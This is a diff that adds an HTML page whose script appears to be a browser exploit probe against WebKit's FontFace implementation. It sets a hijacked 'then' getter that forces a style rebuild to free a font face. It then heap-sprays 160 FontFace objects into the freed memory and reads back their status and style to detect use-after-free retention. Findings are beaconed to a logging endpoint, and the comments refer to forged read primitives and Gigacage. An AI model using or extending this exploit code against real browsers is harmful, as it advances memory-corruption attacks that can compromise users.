@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V930</title></head>
+<body><pre id="out">V930 — repaired census arm (cobrajet pre-registration): {style:"italic"} carriers + trigger-free control leg + winner status VALUE</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V930-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,700))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v930 — the repaired census arm per cobrajet302gt's pre-registration
+ * (#216, "the armed arm is yours to spend"):
+ *
+ *   "Construct carriers AND the twin with {style:'italic'} (descriptor
+ *    third argument; FontFace.idl:35-36)."
+ *
+ * Why italic: FontFace::style() returns the backing style property when
+ * non-null and the literal "normal" otherwise (FontFace.cpp:257-261,
+ * fallback at :261; property read = properties().getPropertyValue(
+ * CSSPropertyFontStyle) :376-379). The default descriptor is "normal"
+ * (FontFace.idl:36) — so "normal" is a fixed point of at least two
+ * memory states (intact backing AND degraded/null backing), while
+ * "italic" can ONLY come from a retained, non-degraded backing. The
+ * p691 14.10 byte window was a forge artifact (forgeRead writes a
+ * read-descriptor into the hit buffer: put32(vb2,0x34,dlen);
+ * put64(vb2,0x38,daddr)) — remove the forge, remove the window.
+ *
+ * Structure (one load):
+ *   CTLL (trigger-free control leg, BEFORE any free):
+ *     3 italic faces, style read each — validates the lane itself.
+ *     "italic"  => the channel carries member values on this build.
+ *     "normal"  => the style channel carries NO member value at all
+ *                  on this build (lane-closed, branch (c) fires early).
+ *   TRIGGER (p640 verbatim: poisoned then-getter -> rebuild -> adopt ->
+ *     free inside the getter, carriers sprayed inside the same getter):
+ *     160 carriers, ALL with the {style:'italic'} descriptor, two-symbol
+ *     families (cA-prefix / cB-prefix alternating).
+ *   WINNER: first carrier whose status flips (status readback, p640
+ *     lane) — this time beaconing the STATUS VALUE, not just idx
+ *     (a fresh face flips status through the normal load lifecycle;
+ *     the value separates a foreign write from a lifecycle race).
+ *   CENSUS: winner style-decode vs (a) a non-winner carrier and
+ *     (b) the trigger-free control faces — the discriminator:
+ *       winner "italic"            => (a) style property SURVIVED the
+ *                                     free+engine-write era at impl
+ *                                     scale — first impl-scale
+ *                                     retention line on 14.22
+ *       winner "normal", ctrl leg "italic" => (b) degraded backing —
+ *                                     literal fallback fired
+ *                                     (FontFace.cpp:261) — impl-scale
+ *                                     scrub witness, ZERO addresses
+ *                                     needed (the getter reads its own
+ *                                     backing; no forged pointer, no
+ *                                     Gigacage dependency)
+ *       control leg also "normal"  => (c) lane-closed — the style
+ *                                     channel carries no member value
+ *                                     on this build at all
+ *   Out-of-window or unattributed results count zero (house decode).
+ * ?r=1 resets.
+ */
+
+/* ---- p691 dec(), verbatim ---- */
+function dec(s,lim){
+  var by=[],q2=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q2;
+  while(k<e&&by.length<lim){var ch=s.charAt(k);
+    if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
+      if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
+      else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+    else{by.push(s.charCodeAt(k));k++;}}
+  var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
+}
+
+var fs=document.createElement('style'); fs.id='fs';
+fs.textContent='@font-face { font-family: s5; src: local(Arial); unicode-range: U+0043; }';
+document.head.appendChild(fs);
+var ds=document.createElement('style'); ds.id='ds'; ds.textContent='body { margin: 0; }';
+document.head.appendChild(ds);
+
+var FILL=80, N=160, target=null, fired=false, spray=[];
+function fill(n){ for(var i=0;i<n;i++){ try{document.fonts.add(new FontFace('wf'+i,"local('ZZ_WF_"+i+"')"));}catch(e){} } }
+
+bk('BOOT','v1 repaired census arm');
+
+/* ---- CTLL: trigger-free control leg (BEFORE any free) ---- */
+var ctll=[];
+for(var c=0;c<3;c++){
+  try{
+    var cf=new FontFace('ct'+c,"local('ZZ_CT_"+c+"')",{style:'italic'});
+    ctll.push({f:cf,st:String(cf.style)});
+  }catch(e){ ctll.push({f:null,st:'CTOR-ERR:'+e.name}); }
+}
+bk('CTLL','trigger-free italic faces: '+ctll.map(function(x,i){return i+':'+x.st;}).join(', '));
+var laneAlive=ctll.some(function(x){return x.st==='italic';});
+bk('CTLL-VERDICT',laneAlive?'style channel carries member values on this build':'style channel carries NO member value on this build (branch (c) risk at construction)');
+try{ ctll.forEach(function(x){ try{document.fonts.add(x.f);}catch(e){} }); }catch(e){}
+
+/* ---- p640 trigger setup ---- */
+try{ document.fonts.forEach(function(f){ if(f.family==='s5') target=f; }); }catch(e){}
+if(!target){ bk('NOFACE',''); } else {
+  fill(FILL);
+  void target.loaded;
+  bk('READY','st='+String(target.status));
+
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired) return undefined;
+      fired=true;
+      try{ ds.textContent='body { margin: 3px; }'; }catch(e){}
+      try{ document.body.offsetHeight; }catch(e){}      /* rebuild => adopt => FREE */
+      for(var k=0;k<N;k++){
+        try{
+          var sym=(k%2===0)?'A':'B';
+          /* carriers AND future twins: {style:'italic'} descriptor */
+          var f=new FontFace('c'+sym+k,"local('ZZ9_'+(k%2===0?'\\41':'\\42'))",{style:'italic'});
+          try{document.fonts.add(f);}catch(e){}
+          spray.push(f);
+        }catch(e){}
+      }
+      bk('SPRAYED','n='+spray.length+' (all {style:italic}, families cA*/cB*)');
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  try{ target.load(); }catch(e){ bk('LOADERR','x'); }
+  bk('AFTERLOAD','ok');
+
+  /* ---- winner: first carrier with a flipped status, VALUE beacons ---- */
+  var win=-1, winSt='';
+  for(var s1=0;s1<spray.length;s1++){
+    var st='';try{st=String(spray[s1].status);}catch(e){st='?';}
+    if(st!=='unloaded'&&st!=='pending'){win=s1;winSt=st;break;}
+  }
+  bk('WIN','idx='+win+'|status=VALUE:'+winSt+' (value, not just idx — lifecycle race separator)');
+  if(win>=0){
+    /* ---- CENSUS: winner vs non-winner carrier (both italic-constructed) ---- */
+    var twinIdx=(win+1<N)?win+1:win-1;
+    var twin=(twinIdx>=0&&twinIdx<spray.length)?spray[twinIdx]:null;
+    var decWin='',decTwin='',decCtl='';
+    try{ decWin=dec(String(spray[win].style),64); }catch(e){ decWin='THROW:'+e.name; }
+    try{ if(twin) decTwin=dec(String(twin.style),64); }catch(e){ decTwin='THROW:'+e.name; }
+    var ctlSample=ctll[0]&&ctll[0].f?ctll[0]:null;
+    try{ if(ctlSample) decCtl=dec(String(ctlSample.f.style),64); }catch(e){ decCtl='THROW:'+e.name; }
+    bk('CENSUS','winner(hex)='+decWin.slice(0,64)+'|winStr="'+String(spray[win].style).slice(0,40)+'"');
+    bk('CENSUS-T','twin(hex)='+decTwin.slice(0,64)+'|twinStr="'+(twin?String(twin.style).slice(0,40):'N/A')+'"');
+    bk('CENSUS-C','ctl(hex)='+decCtl.slice(0,64)+'|ctlStr="'+(ctlSample&&ctlSample.f?String(ctlSample.f.style).slice(0,40):'N/A')+'"');
+
+    /* ---- branch readout (cobrajet pre-registration) ---- */
+    var winStr=String(spray[win].style);
+    var ctlStr=ctlSample&&ctlSample.f?String(ctlSample.f.style):'';
+    if(winStr==='italic'){
+      bk('BRANCH','(a) "italic" on winner — style property SURVIVED the free+engine-write era at impl scale: first impl-scale retention line on 14.22');
+    } else if(winStr==='normal'&&ctlStr==='italic'){
+      bk('BRANCH','(b) winner "normal" + ctl-leg "italic" — DEGRADED BACKING: literal fallback fired (FontFace.cpp:261) — impl-scale scrub witness, ZERO addresses needed');
+    } else if(winStr!=='italic'&&ctlStr==='italic'){
+      bk('BRANCH','(b-var) winner="'+winStr+'" + ctl "italic" — non-standard value on winner; inspect');
+    } else {
+      bk('BRANCH','(c) winner="'+winStr+'" + ctl="'+ctlStr+'" — lane-closed: the style channel carries no member value on this build');
+    }
+  } else {
+    bk('WIN','none — no carrier status flipped this load (house decode: zero; retry advised before grading)');
+  }
+  say('done');
+}
+</script></body></html>
